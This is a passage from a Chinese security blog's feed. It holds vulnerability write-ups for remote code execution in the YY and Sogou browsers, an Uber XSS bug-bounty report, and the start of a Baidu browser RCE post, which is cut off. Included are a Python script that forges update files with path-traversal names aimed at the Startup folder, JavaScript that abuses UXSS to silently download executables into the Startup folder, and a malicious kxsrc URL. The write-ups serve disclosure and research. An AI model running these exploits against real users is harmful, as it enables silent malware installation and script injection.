class="line">output.lzma||3a94912118bc172065d643e1aa847b0d||5794||9bc1ee40c622a0d7a1f96a6c9119bbe6||12288</span><br></pre></td></tr></table></figure></p><p>将生成的output.lzma覆盖<code>loaderjz.dll.lzma</code>，并将<code>loader_catalog.txt</code>中的值修改成上述命令的输出，使用YY浏览器访问测试页面。就可以执行任意程序了。</p><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y97swvl3g20qu0h979t.gif" alt=""></p><h2 id="0x04-任意路径写入漏洞导致RCE"><a href="#0x04-任意路径写入漏洞导致RCE" class="headerlink" title="0x04 任意路径写入漏洞导致RCE"></a>0x04 任意路径写入漏洞导致RCE</h2><p>在测试的过程中，我还发现头部信息中的文件名可以使用<code>..</code>跳转到上一级目录中，也就是说我们可以利用这个点来将一个可执行文件写入到用户的启动目录中。在生成头部信息时，只需要使用文件名：<code>..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe</code>，YY浏览器在下载这个生成的lzma文件之后就会自动将这个文件写入到启动目录中。</p><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg" alt=""></p><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>gen.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">inputFileName = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#fileName = "..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe"</span></span><br><span class="line">fileName = <span class="string">"loaderjz.dll"</span></span><br><span class="line">fileNameLength = len(fileName) + <span class="number">1</span></span><br><span class="line">lzmaFile = inputFileName + <span class="string">".lzma"</span></span><br><span class="line">outputFile = <span class="string">"output.lzma"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(fname)</span>:</span></span><br><span class="line">    hash_md5 = hashlib.md5()</span><br><span class="line">    <span class="keyword">with</span> open(fname, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> iter(<span class="keyword">lambda</span>: f.read(<span class="number">4096</span>), <span class="string">b""</span>):</span><br><span class="line">            hash_md5.update(chunk)</span><br><span class="line">    <span class="keyword">return</span> hash_md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(outputFile, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, <span class="number">32</span> + fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(lzmaFile) + <span class="number">1</span>))</span><br><span class="line">    f.write(struct.pack(<span class="string">'I'</span>, os.path.getsize(inputFileName)))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, fileNameLength))</span><br><span class="line">    f.write(struct.pack(<span class="string">'H'</span>, <span class="number">0x11</span>))</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">16</span>)</span><br><span class="line">    f.write(fileName)</span><br><span class="line">    f.write(<span class="string">'\x00'</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">with</span> open(lzmaFile, <span class="string">"rb"</span>) <span class="keyword">as</span> lzmaF:</span><br><span class="line">        f.write(lzmaF.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> outputFile + <span class="string">"||"</span> + md5(outputFile) + <span class="string">"||"</span> + str(os.path.getsize(outputFile)) +\</span><br><span class="line">        <span class="string">"||"</span> + md5(inputFileName) + <span class="string">"||"</span> + str(os.path.getsize(inputFileName))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;案例链接：&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2016-0221080&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.wooyun.org/bugs/wooyun-2016-02210
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="浏览器安全" scheme="http://zhchbin.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>[浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行</title>
    <link href="http://zhchbin.github.io/2016/10/06/Sogou-Browser-RCE/"/>
    <id>http://zhchbin.github.io/2016/10/06/Sogou-Browser-RCE/</id>
    <published>2016-10-06T02:57:48.000Z</published>
    <updated>2016-10-06T05:19:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>案例链接：<a href="http://www.wooyun.org/bugs/wooyun-2016-0213422" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2016-0213422</a></p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p><h3 id="0x00-首先是UXSS"><a href="#0x00-首先是UXSS" class="headerlink" title="0x00 首先是UXSS"></a>0x00 首先是UXSS</h3><p>具体见：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=569496" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=569496</a></p><p>浏览器版本号：6.3.8.21279</p><h3 id="0x01-既然可以UXSS，我们找个特权域"><a href="#0x01-既然可以UXSS，我们找个特权域" class="headerlink" title="0x01 既然可以UXSS，我们找个特权域"></a>0x01 既然可以UXSS，我们找个特权域</h3><p>从漏洞 <a href="http://wooyun.org/bugs/wooyun-2010-0145023" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0145023</a> 我们可以知道搜狗浏览器的扩展有下载任意文件到任意位置的API！我们自己写一个恶意扩展，提交并通过审核的可能性基本为0。这个API这么好用，但又只能从：se-extension://域名下进行调用，好像很难构造吧。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sogouExplorer.downloads.downloadSilently(&#123;</span><br><span class="line">  url:<span class="string">"http://tmxk.org/img/r-c.png"</span>,</span><br><span class="line">  filename:<span class="string">"dd.exe"</span>,</span><br><span class="line">  path:<span class="string">"d:\",</span></span><br><span class="line"><span class="string">  method:"</span>GET<span class="string">"</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre></td></tr></table></figure><p>我在想怎么利用上面的UXSS的时候，突发奇想的测试了一下，我们能不能打到se-extension://这个域名，于是进行一下测试。我找了一个搜狗浏览器安装时启用的默认扩展，找到其background.html的地址：<code>se-extension://ext238561744/background.html</code>。结果当然是没有那么容易，会提示如下的信息：</p><blockquote><p>Denying load of se-extension://ext238561744/background.html. Resources must be listed in the web_accessible_resources manifest key in order to be loaded by pages outside the extension.</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idldd42oj20hs0cstb1.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idmtvo71j20ry0j0gou.jpg" alt=""></p><h3 id="0x02-难道没法子？"><a href="#0x02-难道没法子？" class="headerlink" title="0x02 难道没法子？"></a>0x02 难道没法子？</h3><p>我认真的读了两秒这个提示后，原来还允许开发者通过<code>web_accessible_resources</code>指定某些资源，从而实现在扩展外被访问！当然，我们就去试试运气去默认的扩展下找找看有没有吧。搜狗浏览器安装的插件在这个目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Username\AppData\Roaming\SogouExplorer\Extension</span><br></pre></td></tr></table></figure><p>grep一下，找到了一个插件，搜狗打假助手，<code>com.sogou.antiCrime</code>，其manifest.xml文件中有以下的内容：</p><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idowi21sj20n90h5465.jpg" alt="">)</p><p>于是就把要打的域名地址换成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se-extension://ext238561744/jd/images/ac-logo.png</span><br></pre></td></tr></table></figure><p>一开始我还觉得这是一个PNG图片，即使没有被拒绝访问，也应该用不了扩展的API吧。我本来是很怀疑能不能行的，正想放弃的时候，我还是觉得应该尝试一发。把PoC里的expolit.html里的f函数改一下，尝试下载一个文件到<code>c:\Users\</code>目录下。</p><p>备注：后来想想其实也对，因为图片在浏览器打开的时候浏览器用自动的使用img标签插入来显示图片。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"f()"</span>)</span><br><span class="line">  <span class="keyword">if</span> (++c1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x1 = x.contentWindow[<span class="number">0</span>].frameElement.nextSibling;</span><br><span class="line">    <span class="comment">// x1.src = 'se-extension://ext238561744/background.html';         // Denied</span></span><br><span class="line">    x1.src = <span class="string">'se-extension://ext238561744/jd/images/ac-logo.png'</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (x1.contentDocument) &#123; ml(); &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      x1.src = <span class="string">"javascript:if(location != 'about:blank') &#123;console.log(location); sogouExplorer.downloads.downloadSilently(&#123;url:'http://127.0.0.1/test.js',filename:'test.js',path:'c:\\\\Users\\\\',method:'GET'&#125;);&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/7184df6bgw1f8idw8oogbj20ru0ivgqz.jpg" alt=""></p><h3 id="0x03-最终我们做到了！"><a href="#0x03-最终我们做到了！" class="headerlink" title="0x03 最终我们做到了！"></a>0x03 最终我们做到了！</h3><p>上面下载好文件之后，我们可以直接使用伪协议来执行，在 <a href="http://wooyun.org/bugs/wooyun-2010-0177221" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0177221</a> 最新版依旧没有加个提示什么的。而且现在我们又扩展名<code>.js</code>了。直接可以执行。当然，我们也可以写到用户的启动目录中，至于怎么拿到用户名，这个 <a href="http://wooyun.org/bugs/wooyun-2010-0176436" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0176436</a> 的漏洞都公开了，然后好像什么修复工作都没有做。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"vbefile:/../../../../../../Users/test.js"</span></span><br></pre></td></tr></table></figure><p>获取用户名的过程：用户访问open.html，跳转到data:域下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href = <span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMjcuMC4wLjEvZXZpbC5qcyc+PC9zY3JpcHQ+"</span></span><br></pre></td></tr></table></figure></p><p>其中base64解密后内容为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://127.0.0.1/evil.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.js在data域下执行，可以获取到用户名列表，然后再跳转到需要写calc.exe到启动目录的页面中，完成写入操作！</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> users = data.match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/g</span>) || [];</span><br><span class="line">  <span class="keyword">var</span> currentUser=[];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; users.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> user = (users[i].match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/</span>) || [<span class="string">""</span>, <span class="string">""</span>])[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>([<span class="string">".."</span>, <span class="string">"All Users"</span>, <span class="string">"Default"</span>, <span class="string">"Default User"</span>, <span class="string">"Public"</span>, <span class="string">"UpdatusUser"</span>, <span class="string">"desktop.ini"</span>].indexOf(user) == <span class="number">-1</span>) &#123;</span><br><span class="line">      currentUser.push(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(currentUser);</span><br><span class="line">  <span class="keyword">return</span> currentUser;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.external.extension(<span class="string">"getRecommendSidebarExts"</span>, <span class="string">"file:///C:/Users/"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> (data.success != <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  location.href = <span class="string">'http://127.0.0.1/exploit.html?users='</span> + getUsers(data.data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>写文件到启动目录下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"f()"</span>)</span><br><span class="line">  <span class="keyword">if</span> (++c1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> users = top.location.search.replace(<span class="string">'?users='</span>).split(<span class="string">','</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> x1 = x.contentWindow[<span class="number">0</span>].frameElement.nextSibling;</span><br><span class="line">    <span class="comment">// x1.src = 'se-extension://ext238561744/background.html';         // Denied</span></span><br><span class="line">    x1.src = <span class="string">'se-extension://ext238561744/jd/images/ac-logo.png'</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (x1.contentDocument) &#123; ml(); &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="keyword">var</span> users_str = <span class="string">''</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; users.length; ++i) &#123;</span><br><span class="line">        users_str += (<span class="string">'"'</span> + users[i] + <span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i != users.length - <span class="number">1</span>)</span><br><span class="line">          users_str += <span class="string">','</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      x1.src = <span class="string">"javascript:if(location != 'about:blank') &#123; var users=["</span> + users_str + <span class="string">"]; for (var i = 0; i &lt; users.length; ++i) sogouExplorer.downloads.downloadSilently(&#123;url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'&#125;);&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>录个用伪协议执行的GIF</p><p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f8idxtyw70g20sg0j2do4.gif" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;案例链接：&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2016-0213422&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.wooyun.org/bugs/wooyun-2016-02134
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
      <category term="浏览器安全" scheme="http://zhchbin.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>[BBP系列一] 人生第一个值钱的XSS漏洞</title>
    <link href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/"/>
    <id>http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/</id>
    <published>2016-09-10T12:40:17.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。</p><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>在看Uber的网站前端JS代码的时候，发现有如下的一段代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> k = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  <span class="comment">// 创建script标签</span></span><br><span class="line">    k.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    k.async = <span class="literal">true</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-id"</span>, u.pubid);</span><br><span class="line">    k.className = <span class="string">"kxct"</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-version"</span>, <span class="string">"1.9"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从location.href参数中读取kxsrc</span></span><br><span class="line">    <span class="keyword">var</span> m, src = (m = location.href.match(<span class="regexp">/\bkxsrc=([^&amp;]+)/</span>)) &amp;&amp; <span class="built_in">decodeURIComponent</span>(m[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件 </span></span><br><span class="line">    k.src = <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(src) ? src : src === <span class="string">"disable"</span> ? <span class="string">""</span> : (location.protocol === <span class="string">"https:"</span> ? <span class="string">"https:"</span> : <span class="string">"http:"</span>) + <span class="string">"//cdn.krxd.net/controltag?confid="</span> + u.pubid;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(k, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>目前代码还能在：<a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js" target="_blank" rel="noopener">https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js</a> 看到，不过修复之后相应的网站已经不会加载这个代码文件了。 通过阅读上面这段代码，我们能够知道参数是<code>kxsrc</code>是可以被用户控制的，而且如果满足一定条件，该参数所指定的js文件就会被加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>咋一看，这段代码似乎没有什么问题：JS文件只能是<code>krxd.net</code>域下的文件。然而，在正则表达式里：<code>.</code>代表的意思是匹配任意字符。我们来做一个简单的实验，F12打开浏览器的调试窗口：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.bkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ckrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.dkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ekrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.fkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://aafkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://abfkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg" alt=""></p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.uber.com/?exp=hp-c&amp;kxsrc=https%3A%2F%2Fwww.akrxd.net%2Fcontroltag%2Fevil.js</span><br></pre></td></tr></table></figure></p><p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif" alt=""></p><p>思考题: 写这段正则判断代码的人应该还希望限制路径，但其实很容易就可以被绕过，怎么绕呢？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://zhchbin.github.io/tags/XSS/"/>
    
      <category term="BBP" scheme="http://zhchbin.github.io/tags/BBP/"/>
    
  </entry>
  
  <entry>
    <title>[浏览器安全系列二] 百度浏览器远程命令执行</title>
    <link href="http://zhchbin.github.io/2016/09/01/Baidu-Browser-RCE/"/>
    <id>http://zhchbin.github.io/2016/09/01/Baidu-Browser-RCE/</id>
    <published>2016-09-01T15:49:59.000Z</published>
    <updated>2016-10-06T03:06:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2010-0216027" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0216027</a></p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!</p><h2 id="百度浏览器远程命令执行"><a href="#百度浏览器远程命令执行" class="headerlink" title="百度浏览器远程命令执行"></a>百度浏览器远程命令执行</h2><ul><li>版本信息：8.4.100.3514</li><li>测试环境：(1)Windows 7 64 bit with IE 10 (2)Windows XP 32 bit with IE 8 </li></ul><h3 id="0x00-套路"><a href="#0x00-套路" class="headerlink" title="0x00 套路"></a>0x00 套路</h3><p>为了实现远程命令执行，我们需要有两个条件：（1）下载可执行文件（比如exe，脚本之类的）到用户的系统中（2）启动我们的可执行程序。接下来的分析都是为了实现这个目标而进行的一系列探索及尝试。</p><h3 id="0x01-UXSS与特权域"><a href="#0x01-UXSS与特权域" class="headerlink" title="0x01 UXSS与特权域"></a>0x01 UXSS与特权域</h3><p>一个价值8000美刀的UXSS：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=560011" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=560011</a> ，百度浏览器上也存在该问题。各种特权域的XSS问题都已经被之前的老司机们挖没有了，所以我们从UXSS入手是最快捷的方式。那百度浏览器的特权域有什么呢？在使用的过程中发现，百度浏览器应用中心（<a href="https://chajian.baidu.com/2015/" target="_blank" rel="noopener">https://chajian.baidu.com/2015/</a>）这个网站直接能够打开 bdbrowser://settings 这个页面。于是，我就分析了一下里面的代码，发现是使用了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">widnow.external.StartRequest(<span class="number">1158</span>, <span class="string">"open_url"</span>,  <span class="string">""</span>,  <span class="string">"[\"offside"</span>,<span class="string">"bdbrowser://settings#extension\"]"</span>)</span><br></pre></td></tr></table></figure></p><p>从而可以确定，这个域名可以使用<code>window.external.StartRequest</code>这个API。也就是说：我们可以通过UXSS -&gt; 在百度浏览器应用中心的网站上调用以上的API。</p><p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7eiv3ahsij21020k7qal.jpg" alt=""></p><h3 id="0x02-寻找文件下载"><a href="#0x02-寻找文件下载" class="headerlink" title="0x02 寻找文件下载"></a>0x02 寻找文件下载</h3><p>在日常使用浏览器的过程中，我们可以设置一个默认的文件下载路径，然后选择不提示。在百度浏览器中，也存在一个这样子的设置，而且可以直接通过上面的API进行设置。所以，我们可以设置其默认不提示，这样子就不需要用户交互完成文件的下载！那么，我们能知道文件的下载路径吗？一开始我是想像二哥那样：<a href="http://wooyun.org/bugs/wooyun-2010-083294" target="_blank" 